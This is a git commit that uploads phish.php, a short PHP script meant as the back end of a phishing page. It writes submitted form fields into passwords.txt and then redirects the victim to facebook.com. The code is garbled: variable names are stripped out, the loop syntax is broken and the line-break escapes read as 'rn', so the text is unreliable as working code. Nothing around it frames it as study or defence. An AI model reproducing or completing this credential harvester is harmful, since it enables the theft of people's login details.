ed032d871c401571d4ce1fd07aef28fe30c9e4c5
jahid43 <68606215+jahid43@users.noreply.github.com>
2020-07-21 22:17:07 +0600

    Add files via upload

---
+++ phish.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: http://facebook.com ');
+ = fopen("passwords.txt", "a");
+foreach(Array as => ) {
+fwrite(, );
+fwrite(, "=");
+fwrite(, );
+fwrite(, "rn");
+}
+fwrite(, "rn");
+fclose();
+exit;
+?>
